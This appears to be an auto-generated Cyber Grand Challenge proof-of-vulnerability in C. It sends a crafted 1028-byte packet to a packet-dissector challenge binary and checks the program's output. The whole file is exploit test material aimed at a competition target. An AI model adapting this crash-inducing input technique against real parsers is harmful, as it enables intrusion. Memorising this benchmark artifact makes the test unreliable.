#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xe9\xfe\x2b\x12"
         "\x7c\x26\xf2\x4a\xc0\xa7\x20\x90\x06\x16\xe3\xd6\xf6\x44\x50\xd9"
         "\xb3\x01\x00\x00\x7a\x25\x2e\x24\x0c\x9a\xf0\xbe\xa5\x6a\x81\x01"
         "\xe4\x3a\x34\x37\xbf\x63\x9c\xfc\x9b\x7d\x22\x2a\xb1\x18\x4d\xe0"
         "\x4d\x32\x19\xbd\xb9\x70\x27\x90\x64\x74\xb4\xe1\x15\x27\x13\xfe"
         "\xad\x7b\xcb\x05\xf7\xae\xec\xa0\x0c\x63\xee\x98\xcb\x44\x9f\xb1"
         "\xcc\xf1\x1e\x66\xc7\xec\x55\xfc\xd7\x0e\xe8\xec\x12\xb8\xa3\x08"
         "\xfa\x10\x6c\x2e\x39\x6e\xc6\x76\x26\x9c\xeb\x80\x2a\xdd\x57\xed"
         "\x2d\xe3\x09\xa4\x60\x66\xc1\x38\xdb\x44\x17\xd5\x42\x28\xf8\xf5"
         "\x36\xbe\xf2\xda\x4e\xb6\x0a\xd1\xa0\xa9\x05\xec\x2f\x32\x0f\x0a"
         "\xa4\xe4\x57\x62\x59\x2b\x4b\x27\x06\x9a\xc4\x46\x6c\x66\x09\xed"
         "\xb5\xde\xb8\xfe\x1e\x71\x92\x36\x00\xc5\xcf\x0e\x29\x28\x3f\x84"
         "\x67\x4e\x92\x0f\xdb\xda\xdb\x57\xde\xa2\xa2\x2d\x7e\x24\xad\xa3"
         "\xf4\x1d\xcb\xf6\x97\xce\x3f\xe3\x89\x6a\x22\xba\xcc\x01\x2b\x1f"
         "\xe5\xa8\x66\xc6\x62\xc4\xf3\xca\x5e\xd3\x52\xf8\x01\x71\x9c\xe0"
         "\x63\xdd\xac\x11\xf7\xa6\x64\x1f\xa1\x42\x88\x3e\xda\x49\x39\x7e"
         "\x76\x93\xd6\x65\xb4\x4b\xc5\xe9\x5a\xfd\x60\x97\xc7\xb6\xb9\xe9"
         "\x27\x74\xd4\x98\x3d\x6d\x2b\x23\xa3\x02\xe8\xb6\x79\x9c\xf3\x64"
         "\xbb\xd6\x79\x7f\xc0\xcf\x1a\xa1\x6c\xf0\x8c\x6a\xd5\x8c\xb0\x2b"
         "\x86\x5d\xab\x49\xd0\x49\x89\x41\xc5\x90\x2f\x5e\x6a\x0f\x78\xd5"
         "\x3e\x1b\xbb\x56\xd9\xc0\x34\x10\xa0\x58\x99\xe5\xa8\x81\xdc\xf3"
         "\x4d\x9b\xc8\xdb\x04\xf8\x73\x6e\x33\x27\x9c\x92\x86\x4b\x50\xeb"
         "\xaf\xe7\x7d\xaa\x59\xa9\x7c\x54\x80\x95\x7f\x7e\xc4\x3a\x17\xe8"
         "\x99\xf9\x4d\xae\x33\xd3\x91\xac\x2d\x5d\x7d\xd9\xdd\xbd\xcc\xbb"
         "\x35\xda\xf2\x89\xc5\xa0\x8c\x8e\x96\xe7\xcf\x4a\x75\x2f\xb6\x4b"
         "\x11\x12\xd4\xc1\x97\x27\x40\xb0\x96\x15\xe3\xf3\x0f\x48\x8d\xa7"
         "\xbe\xdf\x0b\x7c\x5e\xb2\xb5\x67\xda\xb5\xd2\xa6\x94\x4b\x08\x20"
         "\xd2\x45\xab\x2b\xb0\xf8\x47\x71\xa4\x26\xb8\x34\xf8\xc2\xb4\x63"
         "\x38\x9f\x44\x95\x8e\x32\x21\x31\x37\x5a\x46\x32\x27\x13\x09\x63"
         "\x94\x96\xb2\x63\xb5\x43\x57\x21\x17\x09\xcf\xcc\xa8\x99\xf2\xaa"
         "\xdf\xc4\xc5\x65\xbb\x73\x8c\x6a\x6d\xaf\x6b\x3c\xd9\x68\x37\xa4"
         "\x44\xac\x5d\xb6\x33\x9b\x3e\x91\x99\x45\x35\xd7\xce\xdc\x8a\x20"
         "\x7f\xc6\x14\x9c\x22\x5b\x7e\xe3\x81\xdf\xd4\x77\xd3\x36\x27\xd5"
         "\x6a\xb0\x8d\xf7\x92\xf6\x0b\x01\x25\xf9\xc2\x31\x85\xff\x36\x36"
         "\x00\xb5\xc4\x5e\x4f\xf6\xad\xce\xc4\x17\x67\xea\x7a\x55\x4a\x05"
         "\x31\xab\xa3\x48\x71\x4f\xae\x05\x50\x8e\xcf\xd2\x38\x37\x0e\xc4"
         "\xbc\x06\x84\xfc\x54\x1a\x71\x70\xd5\xc8\x14\x6e\x29\x48\xc7\x3c"
         "\xea\x24\xa7\x79\xc1\x47\xd7\x80\x52\x75\xb9\x06\x8f\x1a\xb5\xb8"
         "\xe1\xf7\x4c\x58\xaa\x6f\xed\x21\x9a\x95\xc1\xac\xc1\x86\x40\x6c"
         "\xbd\xb0\x80\x13\x79\xe5\xe4\x53\x6f\x88\x19\x4c\xe2\xf5\xcd\xbe"
         "\x42\x93\xeb\xc0\x9d\x4e\x72\x8f\xc5\x0e\x4d\xbb\xe1\xcb\x8e\xbb"
         "\xf2\xbc\x82\x5d\xe1\xf4\xf6\x43\x9c\x19\x04\x8f\x20\xe0\x3f\x84"
         "\x87\xa6\x3e\x43\xb1\xa8\xbf\x46\x85\x7b\x56\xab\xbe\xf5\xb5\x28"
         "\xc2\xbd\x4c\x41\x0d\xa3\xaf\xe7\x9e\xd9\x82\x17\x64\x7a\xe8\x49"
         "\xc4\xe2\x77\x31\x65\xfb\x01\xd2\x3a\x5d\x4f\x5c\x22\x7e\x1e\x0c"
         "\xb5\xf6\xcd\x82\x83\xa0\x66\x31\x6a\x0d\xe8\x83\x86\xd0\x48\x7a"
         "\x2d\xdb\x33\xd7\x5e\xe8\x5c\x75\x55\x4d\x20\x32\x53\x00\x93\x19"
         "\x60\xf4\x3c\x30\xbe\x89\x26\x3d\x26\x93\x5a\x48\x01\x42\xd5\x56"
         "\x90\x15\x42\xe1\xfd\xc6\x5d\xb3\x77\xfa\x8f\x31\x34\x85\x26\x67"
         "\x49\x5b\x9b\x00\x09\x5b\x54\x02\x4f\x8a\x73\x85\x2a\x0a\x1e\xdd"
         "\x81\xcf\x5d\xc1\xdd\xf9\x51\xe5\x59\x3e\xc3\x3a\xa8\xa6\x94\x8e"
         "\xb8\xbb\xb9\x24\x49\xf9\x1b\xe8\x8f\xb7\x15\x37\x49\x14\x99\xf2"
         "\x3b\x86\xd3\x90\x3b\xce\xa4\x3e\x39\x33\x1c\x09\xa0\x2d\x66\xeb"
         "\x8c\xc8\x3d\x0c\x91\x9a\xd8\x9d\x1a\xa6\x92\x55\xfa\x98\x80\x42"
         "\x5e\x71\xad\x80\xae\x90\x7d\x1d\x72\xef\xac\x96\x8b\x82\x23\xc7"
         "\x99\xb4\x6a\x2e\x2c\x13\xae\xf2\xf6\x07\xf7\x3c\xc0\x61\x35\x0c"
         "\xdf\x83\x7a\x99\xd8\xfc\xb8\xe8\x8c\x4b\x60\x26\x18\xe0\x92\x56"
         "\x94\x91\xd9\x33\x6d\x72\x9b\x84\xdd\x84\x97\xf6\x4d\x1e\x7f\x34"
         "\x08\x5e\xb3\xaa\x09\xac\x25\x4b\x36\x40\x3e\xb2\xa2\xe1\x2d\xfc"
         "\x81\x70\xb2\x57\x64\x54\x14\x0e\xd1\x69\x10\x9e\x4b\x11\xd9\x45"
         "\x62\x52\x85\x6b\x68\xaa\x62\x72\xbd\xda\xb4\xc4\x5e\x96\x97\xc0"
         "\x7e\x9f\xac\x0a\x01\x0f\x00\xaf\x08\xad\xe0\x52\x96\x18\x13\xd1"
         "\x2e\xe3\x7c\xb5\xc6\x5f\x09\x11\xf6\xcd\xad\xb9\x9b\xe4\x9e\x03"
         "\xbd\x3c\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===torskpiss
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x74\x6f\x72\x73\x6b\x70\x69\x73\x73";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
